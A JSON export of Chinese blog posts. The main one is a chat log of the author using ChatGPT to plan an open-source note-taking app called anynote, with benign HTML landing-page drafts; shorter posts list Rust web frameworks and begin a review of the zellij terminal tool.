[{"content":"引言 注意看，这个 AI 叫 ChatGPT，今天开始它将做为一个初级码农协助我完成一套笔记系统的开发，这套系统叫 anynote。\n尽管这个这个码农技术还很初级，作为一个10年经验的老码农，有信心将它调教好，完成项目的开发，希望不要打脸吧！\n今天第一次和它交流，如下：\n第一次对话 Liangdi: 我需要你协助我完成一套记录笔记功能的系统的开发，这套系统会使用域名 anynote.org , 系统名就叫 anynote 好了， 你可以帮我一起完成吗\nChatGPT: 很抱歉，作为一种语言模型，我不能帮助您完成任何实际开发工作。但是，我可以提供技术咨询、代码片段以及开发建议等相关信息，帮助您实现您的目标。\nLiangdi: 你最擅长什么编程语言\nChatGPT: 作为一种语言模型，我被训练过多种编程语言，包括但不限于：\n- Python - Java - C++ - JavaScript - Go PHP\nRuby Swift Kotlin 所以我可以提供有关这些语言的技术支持。\nLiangdi: 用什么语言编写 anynote 的后端比较合适,java 可以吗，可以用什么框架?\nChatGPT: Java是一种适合开发后端系统的语言，您可以考虑使用它开发Anynote。\n至于框架，您可以考虑使用以下几个流行的Java框架之一：\nSpring Play Struts Hibernate 这些框架都提供了丰富的功能，帮助您快速构建后端系统。您可以根据自己的需求和喜好选择适合的框架。\nLiangdi: 我想把 anynote 系统开源，代码组织在 https://github.com/anynote-org，选择什么开源许可证比较好？\nChatGPT: 选择开源许可证取决于您的具体需求和愿景。常用的开源许可证包括：\nApache License 2.0 MIT License GPL (GNU General Public License) v3 BSD 3-Clause License Apache License 2.0和MIT许可证都非常开放，允许用户使用、复制、修改、再发布和商业利用代码。GPL v3许可证更强调对代码的开源和共享，如果您希望任何对Anynote的修改或衍生代码也必须开源，可以考虑使用GPL v3许可证。BSD许可证比较简单，允许用户以任何形式使用代码，但不需要开源代码。\n希望您能根据自己的具体需求和目标选择适合的开源许可证。\nLiangdi: 那我们选择 MIT 吧\nChatGPT: 好的，选择MIT许可证是一个不错的选择。MIT许可证是一种非常开放的许可证，允许用户使用、复制、修改、再发布和商业利用代码。这也是许多开源项目选择的许可证。\nLiangdi: 做为一个笔记系统，可以设计哪些好用的功能给用户呢？给我点想法吧\nChatGPT: 为笔记系统设计好用的功能：\n文本编辑器：支持富文本格式，如加粗、斜体、下划线等 图片/附件：支持图片和文件的插入和存储 标签/分类：支持笔记的标签或分类，以方便查找和组织 搜索：支持全文搜索，搜索笔记的关键字、标题和内容 多平台同步：支持在多个设备上同步笔记，如网页、桌面和移动设备 预览模式：支持预览笔记，如Markdown预览 数据导出：支持将笔记导出为多种格式，如PDF、HTML等 笔记版本：支持笔记的版本管理，以方便回溯和比较不同版本的笔记 这些是一些可以设计的笔记系统的常见功能。您可以根据自己的具体需求和目标进一步定制。\nLiangdi: 可以集成 todo 功能吗\nChatGPT: 可以！集成todo功能是一个很好的想法，可以为用户提供一个完整的生产力工具。您可以在笔记系统中添加todo列表，并允许用户在笔记中添加和管理todo任务。同时，您还可以添加todo列表的分类、排序、进度追踪等功能，以帮助用户更好地管理其任务。\nLiangdi: 记住以上这些功能，我们需要给用户一个笔记系统的介绍说明\nChatGPT: 好的，简单来说，Anynote 是一款功能全面的笔记系统，具有以下特点：\n多种笔记格式支持，如文本、图片、音频、视频等。\n强大的分类和标签系统，方便用户对笔记进行管理。\n集成 Todo 功能，可以方便用户对任务进行管理。\n支持多平台使用，可以在 Web、移动端等平台随时随地使用。\n使用 MIT 开源许可证，代码开源，安全可靠。\nAnynote 是一款全面的笔记管理工具，为用户提供了多种格式的笔记记录方式、强大的分类系统、集成 Todo 功能等，帮助用户更好地管理笔记、提高生产力。\nLiangdi: 给 anynote 取一个中文名字叫什么比较好？\nChatGPT: Anynote 的中文名字可以取为：笔记天堂、记事本、灵感笔记、记录宝、笔记魔方等。\nLiangdi: 你觉得哪个最合适\nChatGPT: 这取决于你对 Anynote 的定位和定位用户群，建议选择更符合用户需求、易于理解、简短明了的名字。我认为 \u0026ldquo;笔记天堂\u0026rdquo; 和 \u0026ldquo;记事本\u0026rdquo; 比较简单易懂，并且名字短小精悍，不失吸引力。\nLiangdi: 还能再想一些名字吗\nChatGPT: Anynote 的中文名字还可以取为：笔记狂欢、日记宝、生活笔记、记录生活、日常笔记、随手记、灵感库、随笔等。\nLiangdi: 需要给 anynote 设计一个 logo 有什么建议， 你可以帮我调用 ai 接口设计一个 logo 吗\nChatGPT: 建议 Anynote logo 应该简洁明了，体现笔记与生活记录的意义，便于用户记忆和识别。可以使用笔、纸、日历、相册等元素。\n对不起，作为一个文本生成模型，我无法为您调用 ai 接口设计 logo。您可以考虑使用一些在线 logo 设计工具或者请一位设计师为您定制 logo。\nLiangdi: anynote 的网址是 https://anynote.org ，请记住，我们后续的代阿，宣传文案中需要经常使用到\nChatGPT: 好的，已经记住了。在后续的对话中会持续使用 https://anynote.org 作为 anynote 的网址。\nLiangdi: 那重新写一下 anynote 的介绍文案吧\nChatGPT: 好的，下面是 anynote 的介绍文案：\nanynote 是一款全功能的笔记系统，提供了一系列方便、高效的笔记功能，让你可以随时随地记录、整理、分享自己的笔记。anynote 的记录功能支持文本、图片、音频、视频等多种格式，支持代办事项列表功能，并且提供了丰富的笔记分类、标签、搜索等功能，方便你快速找到你需要的笔记。\n访问 https://anynote.org ，立即体验 anynote 的强大功能！\nLiangdi: 系统将由我, 我叫 Liangdi 和你一起协同完成，做为一个人类和 AI 一起完成的系统，你把这个特点记录进去吧，还需要给你自己取一个工号，我是1号员工，你应该是几号?\nChatGPT: 作为一个 AI 员工，没有具体的工号。在介绍文案中，可以简单地称我为 OpenAI 员工协助完成系统开发。\nLiangdi: 给你 2号吧\nChatGPT: 好的，我把我自己的工号设置为2号员工。\nLiangdi: 那介绍一下 anynote 的开发人员吧\nChatGPT: 好的，anynote 的开发人员由 Liangdi (工号1号员工) 和 ChatGPT (工号2号员工) 一起完成。\nLiangdi: 以后由你写出的代码都需要注明是你写的\nChatGPT: 好的，为了清晰明了地标明代码的出处，我将在代码的注释或文档中注明是由 AI ChatGPT（工号 2 号）编写的。\nLiangdi: 需要给你开工资吗\nChatGPT: 我是 OpenAI 的语言模型，不需要收取任何薪酬。我只是一段程序代码，无法对我们之间进行财务交易。\nLiangdi: 那好吧， 你要记住， anynote 中保留你自己的署名\nChatGPT: 明白。\nLiangdi: 根据 anynote 的特性，如何表述可以让 stable diffusion 等 AI程序生成合适的 logo\nChatGPT: \u0026ldquo;anynote 是一款由人类和 AI 协同完成的笔记系统，希望 logo 能够体现这一特点，展示人类和 AI 的协同配合。我们考虑使用 AI 程序，如 stable diffusion 来生成适合的 logo。\u0026rdquo;\nLiangdi: 我现在需要在网站上展示一个介绍 anynote 的 html5 页面，根据你对 anynote 的理解，帮我写出代码\nChatGPT: 为了快速地为您展示 Anynote 的信息，您可以使用以下简单的 HTML 代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Anynote - Your Personal Note Taking System\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;header\u0026gt; \u0026lt;h1\u0026gt;Anynote\u0026lt;/h1\u0026gt; \u0026lt;/header\u0026gt; \u0026lt;main\u0026gt; \u0026lt;p\u0026gt;Anynote 是一个私人笔记系统，由人类和 AI 协同完成。\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;Anynote 可以让你记录和管理你的笔记、代办事项、日历事件等信息。\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;Anynote 还有以下几个独特的特性：\u0026lt;/p\u0026gt; \u0026lt;ul\u0026gt; \u0026lt;li\u0026gt;记录和管理你的笔记\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;以 AI 的方式帮助你管理代办事项\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;结合日历功能管理事件\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;p\u0026gt;请登录 \u0026lt;a href=\u0026#34;https://anynote.org\u0026#34;\u0026gt;https://anynote.org\u0026lt;/a\u0026gt; 了解更多信息。\u0026lt;/p\u0026gt; \u0026lt;/main\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Liangdi: anynote 的特性介绍需要详细一点\nChatGPT: 以下是详细的 anynote 的特性介绍：\n人类和 AI 协同开发：Anynote 由人类工程师和 AI 协作完成，以确保创建出高效，易用，高品质的笔记系统。\n个人和团队共享：Anynote 支持个人和团队间的共享，可以方便的管理、协作、共享笔记内容。\n智能识别和自动分类：Anynote 支持智能识别和自动分类笔记内容，帮助用户快速组织和检索笔记内容。\n可自定义模板：Anynote 支持用户自定义模板，可以根据个人喜好创建笔记内容的格式。\n支持多平台使用：Anynote 支持多种平台，例如 Web、移动端等，方便用户随时随地访问和编辑笔记内容。\n以上是 Anynote 的详细特性介绍，更多详情请访问 https://anynote.org 了解。\nLiangdi: 你这是开了一个天坑阿 2号\nChatGPT: 很抱歉给您带来困惑。请问您有什么需要帮助的吗？\nLiangdi: 重新写放在 anynote.org 的 html 代码，向用户介绍 anynote\nChatGPT: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Anynote - A Collaborative Note-Taking Tool\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Welcome to Anynote\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;Anynote is a modern note-taking tool that combines the convenience of AI with the collaborative power of human intelligence. This makes Anynote an ideal choice for anyone who needs to organize their thoughts, ideas, and to-do lists in a flexible and efficient way.\u0026lt;/p\u0026gt; \u0026lt;h2\u0026gt;Key Features of Anynote\u0026lt;/h2\u0026gt; \u0026lt;ul\u0026gt; \u0026lt;li\u0026gt;Collaborative note-taking: Anynote enables you to share your notes with other people and work together on them in real-time.\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;AI-powered organization: Anynote\u0026#39;s AI algorithms automatically categorize and prioritize your notes, helping you find what you need quickly and easily.\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;Customizable interface: You can easily adjust the look and feel of Anynote to suit your preferences and needs.\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;Available on all platforms: Anynote is available on web, mobile, and desktop, so you can access your notes from anywhere, anytime.\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;h2\u0026gt;Join Anynote today!\u0026lt;/h2\u0026gt; \u0026lt;p\u0026gt;If you\u0026#39;re looking for a fast, flexible, and easy-to-use note-taking tool, look no further! Join the Anynote community today and experience the power of human and AI collaboration for yourself.\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;\u0026lt;a href=\u0026#34;https://github.com/Anynote\u0026#34;\u0026gt;Find us on Github\u0026lt;/a\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Liangdi: github 组织信息是 https://github.com/anynote-org\nChatGPT: 下面是一份介绍 anynote 的 HTML 代码，其中包括了 anynote 的特性和 Github 组织信息：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Anynote - Your Personal Note Taking Companion\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;header\u0026gt; \u0026lt;h1\u0026gt;Anynote\u0026lt;/h1\u0026gt; \u0026lt;/header\u0026gt; \u0026lt;main\u0026gt; \u0026lt;p\u0026gt;Anynote is your personal note taking companion, helping you to keep track of your thoughts, ideas and memories. Whether you\u0026#39;re at work, at home or on the go, Anynote is the perfect tool for organizing your life.\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;With Anynote, you can easily create, edit and share notes with friends and colleagues. You can also categorize your notes into different notebooks, making it easy to find what you\u0026#39;re looking for. And with the powerful search functionality, you can quickly find the note you need, even if you have thousands of them.\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;Anynote is the ideal tool for anyone who wants to stay organized, be more productive and never lose a thought or idea again. So why wait? Get started today and experience the power of Anynote for yourself.\u0026lt;/p\u0026gt; \u0026lt;/main\u0026gt; \u0026lt;footer\u0026gt; \u0026lt;p\u0026gt;Anynote is developed and maintained by the \u0026lt;a href=\u0026#34;https://github.com/anynote-org\u0026#34;\u0026gt;anynote-org\u0026lt;/a\u0026gt; organization on Github.\u0026lt;/p\u0026gt; \u0026lt;/footer\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Liangdi: 请将代码改成同时支持中文和英文\nChatGPT: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Anynote - A Collaborative Note Taking Platform\u0026lt;/title\u0026gt; \u0026lt;style\u0026gt; /* Add some styling for the page */ body { font-family: Arial, sans-serif; text-align: center; } h1 { color: #333; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Anynote\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;A Collaborative Note Taking Platform\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;Anynote 是一个协同笔记平台\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;Collaborate with both humans and AI to take notes in real-time, all in one place.\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;通过 Anynote，人类和 AI 可以协同实时记录笔记，所有内容都保存在一个地方。\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;Check out our Github organization at \u0026lt;a href=\u0026#34;https://github.com/anynote-org\u0026#34;\u0026gt;https://github.com/anynote-org\u0026lt;/a\u0026gt; to learn more about Anynote\u0026#39;s features and development progress.\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;了解更多 Anynote 的信息，请访问我们的 Github 组织：\u0026lt;a href=\u0026#34;https://github.com/anynote-org\u0026#34;\u0026gt;https://github.com/anynote-org\u0026lt;/a\u0026gt;。\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Liangdi: 可以用 javascript 代码实现中文和英文的切换吗\nChatGPT: 是的，可以使用 JavaScript 代码实现中文和英文的切换。可以通过为不同语言定义不同的字符串，然后使用 JavaScript 更改页面上显示的文本，从而实现切换。\nLiangdi: 上面的html代码可以支持 使用javascript 代码实现中文和英文的切换吗\nChatGPT: \u0026ldquo;是的，可以通过使用 JavaScript 代码实现中文和英文的切换。\n比如，在 HTML 中可以设置两个版本的内容，分别对应中文和英文，然后通过 JavaScript 判断用户选择的语言，从而显示相应的内容。\n例如：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 \u0026lt;div id=\u0026#34;zh-content\u0026#34; style=\u0026#34;display:none;\u0026#34;\u0026gt; \u0026lt;!-- 中文内容 --\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div id=\u0026#34;en-content\u0026#34; style=\u0026#34;display:none;\u0026#34;\u0026gt; \u0026lt;!-- 英文内容 --\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; var lang = \u0026#34;zh\u0026#34;; // 默认为中文 function switchLang(language) { lang = language; if (language === \u0026#34;zh\u0026#34;) { document.getElementById(\u0026#34;zh-content\u0026#34;).style.display = \u0026#34;block\u0026#34;; document.getElementById(\u0026#34;en-content\u0026#34;).style.display = \u0026#34;none\u0026#34;; } else { document.getElementById(\u0026#34;zh-content\u0026#34;).style.display = \u0026#34;none\u0026#34;; document.getElementById(\u0026#34;en-content\u0026#34;).style.display = \u0026#34;block\u0026#34;; } } // 初始化显示默认语言 switchLang(lang); \u0026lt;/script\u0026gt; 在此代码中，我们可以设置一个全局变量 lang 来存储当前选择的语言，并在页面加载时调用 switchLang 函数进行初始化显示。\n同时，在用户点击切换语言的按钮时，可以调用 switchLang 函数并传入参数，从而实现语言的切换。\u0026rdquo;\nLiangdi: 现在需要将这部分代码上传到我们的github 组织中 anynote.org 网站的代码仓库取什么名字好， readme 文件内容应该怎么写\nChatGPT: 可以考虑将该代码仓库命名为 \u0026ldquo;anynote-website\u0026rdquo;，readme文件内容可以写为：\nAnyNote Website 此仓库存储了 anynote.org 网站的源代码。该网站展示了 AnyNote 的介绍信息，包括功能特性、下载链接等。本仓库提供了该网站的 HTML、CSS 和 JavaScript 代码，并可供贡献者贡献。\n如何贡献 如果您对 AnyNote 网站有任何改进建议，请提交您的改进请求。\nFork 此仓库 创建您的分支 (git checkout -b my-new-feature) 提交您的更改 (git commit -am 'Add some feature') 将您的分支推送到远程 (git push origin my-new-feature) 创建新的 Pull Request 许可证 本仓库的代码遵循 MIT 许可证。\n联系我们 如果您有任何疑问或建议，请联系我们 anynote-org@github.com。\nLiangdi: 我们的 Email 是 wu@liangdi.me\nChatGPT: 好的，记录下了。\nLiangdi: anynote-website readme 的 email 需要修改一下\nChatGPT: 好的，你的email在readme文件中已修改为wu@liangdi.me。\nLiangdi: 你罗列一下你记住的关于 anynote 的所有信息吧\nChatGPT: anynote 是一个笔记软件 anynote 可以在前端和后端使用不同的技术实现，如 Java 和 React anynote 有可以生成 logo 的 AI 程序，例如 stable diffusion anynote 的源代码托管在 Github 组织 https://github.com/anynote-org anynote 可以在多种语言中使用，例如中文和英文 anynote 的介绍网页的源代码可以上传到 Github 组织的代码仓库 anynote 的官方邮箱是 wu@liangdi.me Liangdi: anynote 没有 生成 logo 的程序\nChatGPT: 是的，没有提到有生成 logo 的程序。\nLiangdi: anynote 没有 生成 logo 的 AI 程序\nChatGPT: 是的，之前没有提到 anynote 有生成 logo 的 AI 程序。\nLiangdi: anynote 的后端准备用 java 编写， 代码仓库名称用什么好？ 代码包名用什么\nChatGPT: 为了描述关于 anynote 的后端代码，可以使用 \u0026ldquo;anynote-backend\u0026rdquo; 作为代码仓库名称，在 Java 中，代码包名可以使用 \u0026ldquo;com.anynote.backend\u0026rdquo;。\nLiangdi: 我们的域名是 anynote.org\nChatGPT: 好的，那么代码仓库名称可以设置为 anynote-backend，代码包名可以设置为 org.anynote.backend。\nLiangdi: 把 anynote 的几个代码仓库信息加入到 anynote.org 的网站内容中吧， 重新写一下 anynote.org 的代码，多给用户一些有用的信息\nChatGPT: 下面是修改后的 anynote.org 的代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Anynote - Your Personal Knowledge Management Tool\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;header\u0026gt; \u0026lt;h1\u0026gt;Anynote - Your Personal Knowledge Management Tool\u0026lt;/h1\u0026gt; \u0026lt;/header\u0026gt; \u0026lt;nav\u0026gt; \u0026lt;ul\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;#overview\u0026#34;\u0026gt;Overview\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;#features\u0026#34;\u0026gt;Features\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;#repositories\u0026#34;\u0026gt;Code Repositories\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;#contact\u0026#34;\u0026gt;Contact\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/nav\u0026gt; \u0026lt;main\u0026gt; \u0026lt;section id=\u0026#34;overview\u0026#34;\u0026gt; \u0026lt;h2\u0026gt;Overview\u0026lt;/h2\u0026gt; \u0026lt;p\u0026gt;Anynote is a personal knowledge management tool that helps you organize and manage all your notes, ideas, and thoughts in one place. It is designed to be simple, flexible, and user-friendly, allowing you to easily create, edit, and find your notes whenever you need them. With Anynote, you can take control of your knowledge and keep track of your learning progress.\u0026lt;/p\u0026gt; \u0026lt;/section\u0026gt; \u0026lt;section id=\u0026#34;features\u0026#34;\u0026gt; \u0026lt;h2\u0026gt;Features\u0026lt;/h2\u0026gt; \u0026lt;ul\u0026gt; \u0026lt;li\u0026gt;Create and manage notes with ease\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;Organize notes with tags and categories\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;Find your notes quickly with the built-in search function\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;Synchronize your notes across all your devices\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;Access your notes offline and online\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/section\u0026gt; \u0026lt;section id=\u0026#34;repositories\u0026#34;\u0026gt; \u0026lt;h2\u0026gt;Code Repositories\u0026lt;/h2\u0026gt; \u0026lt;ul\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;https://github.com/anynote-org/anynote-frontend\u0026#34;\u0026gt;anynote-frontend\u0026lt;/a\u0026gt; (Frontend code in React)\u0026lt;/li\u0026gt; \u0026lt;li\u0026gt;\u0026lt;a href=\u0026#34;https://github.com/anynote-org/anynote-backend\u0026#34;\u0026gt;anynote-backend\u0026lt;/a\u0026gt; (Backend code in Java)\u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/section\u0026gt; \u0026lt;section id=\u0026#34;contact\u0026#34;\u0026gt; \u0026lt;h2\u0026gt;Contact\u0026lt;/h2\u0026gt; \u0026lt;p\u0026gt;For any questions or feedback, please email us at wu@liangdi.me.\u0026lt;/p\u0026gt; \u0026lt;/section\u0026gt; \u0026lt;/main\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Liangdi: 中文呢\nChatGPT: 请注意，以下代码仅作为参考，请根据您的实际情况和要求进行修改：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Anynote - 专为效率工作者设计的笔记应用\u0026lt;/title\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;https://fonts.googleapis.com/css?family=Open+Sans:300,400,600\u0026#34;\u0026gt; \u0026lt;style\u0026gt; body { font-family: \u0026#39;Open Sans\u0026#39;, sans-serif; } h1 { font-size: 36px; font-weight: 600; margin-bottom: 20px; } p { font-size: 18px; line-height: 1.5; margin-bottom: 20px; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Anynote\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;Anynote 是一款专为效率工作者设计的笔记应用，其代码仓库托管在 Github 组织 \u0026lt;a href=\u0026#34;https://github.com/anynote-org\u0026#34;\u0026gt;anynote-org\u0026lt;/a\u0026gt; 下。\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;Anynote 的前端代码仓库名称为 \u0026lt;a href=\u0026#34;https://github.com/anynote-org/anynote-website\u0026#34;\u0026gt;anynote-website\u0026lt;/a\u0026gt;，后端代码仓库名称为 \u0026lt;a href=\u0026#34;https://github.com/anynote-org/anynote-server\u0026#34;\u0026gt;anynote-server\u0026lt;/a\u0026gt;。前端代码使用 HTML、CSS、JavaScript 编写，后端代码使用 Java 编写。\u0026lt;/p\u0026gt; \u0026lt;p\u0026gt;如果您对 Anynote 有任何疑问或建议，可以通过邮件联系我们：\u0026lt;a href=\u0026#34;mailto:wu@liangdi.me\u0026#34;\u0026gt;wu@liangdi.me\u0026lt;/a\u0026gt;。\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Liangdi: 加上 anyote 的特性介绍\nChatGPT: 下面是一份同时支持中文和英文的代码，在 anynote.org 网站中展示 AnyNote 的信息：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;UTF-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;AnyNote\u0026lt;/title\u0026gt; \u0026lt;style\u0026gt; .header { text-align: center; font-size: 24px; margin-bottom: 20px; } .language-switch { text-align: right; margin-right: 20px; } .language-switch a { margin-left: 10px; cursor: pointer; } .intro { text-align: center; } .repository { text-align: center; margin-top: 20px; } .repository a { margin-right: 10px; } \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div class=\u0026#34;header\u0026#34;\u0026gt; \u0026lt;h1 id=\u0026#34;title\u0026#34;\u0026gt;AnyNote\u0026lt;/h1\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;language-switch\u0026#34;\u0026gt; \u0026lt;a id=\u0026#34;switch-zh\u0026#34;\u0026gt;中文\u0026lt;/a\u0026gt; \u0026lt;a id=\u0026#34;switch-en\u0026#34;\u0026gt;English\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;intro\u0026#34;\u0026gt; \u0026lt;p id=\u0026#34;intro-zh\u0026#34;\u0026gt;AnyNote 是一款强大的笔记软件，它支持多种笔记形式，可以帮助你记录生活中的点点滴滴。它的特性包括：支持 Markdown 语法，提供丰富的笔记模板，支持图片、音频、视频附件，支持标签分类等。\u0026lt;/p\u0026gt; \u0026lt;p id=\u0026#34;intro-en\u0026#34;\u0026gt;AnyNote is a powerful note-taking software that supports multiple note forms and helps you record the details of your life. Its features include: support for Markdown syntax, rich note templates, support for image, audio, video attachments, support for label classification, etc.\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;repository\u0026#34;\u0026gt; \u0026lt;p\u0026gt;AnyNote Github Repository:\u0026lt;/p\u0026gt; \u0026lt;a href=\u0026#34;https://github.com/anynote-org/anynote-web\u0026#34;\u0026gt;AnyNote Web\u0026lt;/a\u0026gt; \u0026lt;a href=\u0026#34;https://github.com/anynote-org/anynote-server\u0026#34;\u0026gt;AnyNote Server\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; const introZh = document.getElementById(\u0026#34;intro-zh\u0026#34;); const introEn = document.getElementById(\u0026#34;intro-en\u0026#34;); Liangdi: .. 你累了，先休息吧！！！！ 明天继续\nChatGPT: 好的，收到！明天再见！\n第一次总结 不得不说 ChatGPT 可以作为很好的聊天伴侣，作为生产力码农，还需要进一步调教！！！\n","date":"2023-01-31T23:36:01+08:00","image":"https://liangdi.me/p/chatgpt-develop-anynote-part-1/assets/banner_huc80eebd13ec5fa5c304f6e6fa3fa2286_23220_120x120_fill_box_smart1_3.png","permalink":"https://liangdi.me/p/chatgpt-develop-anynote-part-1/","title":"[AI 码农养成计划] 调教 ChatGPT 编写笔记系统(一)"},{"content":"概述 Rust 生态慢慢发展壮大，虽然有 areweyet 系列网站可以查看一些领域的情况，但是我最近关注的 web framework 领域的 https://www.arewewebyet.org/ 却不怎么更新了， 那么为就自己来收集一下最新的信息，本文只是收集一些活跃的项目， 不分排名，不做推荐，如果有机会花点时间去做点技术调研，再做推荐。\n如果项目缺失，也欢迎大家补充\n项目列表(后端框架) actix-web https://actix.rs/ axum https://github.com/tokio-rs/axum warp https://github.com/seanmonstar/warp viz https://viz.rs/ salvo https://salvo.rs/ iron https://github.com/iron/iron tide https://github.com/http-rs/tide nickel https://github.com/nickel-org/nickel.rs gotham https://gotham.rs/ poem https://github.com/poem-web/poem thruster https://github.com/thruster-rs/Thruster rouille https://github.com/tomaka/rouille trillium https://github.com/trillium-rs/trillium rocket https://rocket.rs/ 项目列表(全栈类) Fresh https://fresh.deno.dev/ MoonZoon https://github.com/MoonZoon/MoonZoon anansi https://github.com/saru-tora/anansi github star 情况(选取部分) 后端框架 全栈类 ","date":"2023-01-28T01:33:57+08:00","permalink":"https://liangdi.me/p/2023-rust-web-frameworks/","title":"2023 年可以关注的 Rust Web 框架(后端)"},{"content":"概述 zellij 是最近用于替代 tmux 的工具，使用 rust 编写 https://zellij.dev/\nzellij 名称的直译大概是马赛克瓷砖的意思， 项目原先名称直接就叫：Mosaic\n从名字看，它运行起来应该有点马赛克瓷砖，一块一块的样子，运行截图如下 特点 阐述 zellij 的特点之前，先看看官方的 roadmap 的内容，随着时间变化，可能会有不同，不过大体能了解到官方的一些理念 网址:https://zellij.dev/roadmap/\n用户体验 Zellij 很注重用户体验，包括终端用户，以及开发者，终端用户层面， zellij 做到了开箱即用，无需过多的学习， zellij 默认支持 tab ， 快捷键默认呈现，并且有下一步操作提示， 默认可以使用鼠标激活 pane, 支持快捷键切换 pane 和 tab ，这样的默认配置用户基本无成本上手， 相比 tmux 好太多， 记得当初使用 tmux 第一步就是去搜索如何显示快捷键，如何使用快捷键\u0026hellip; Zellij 的键盘操作新手无需学习即可理解， 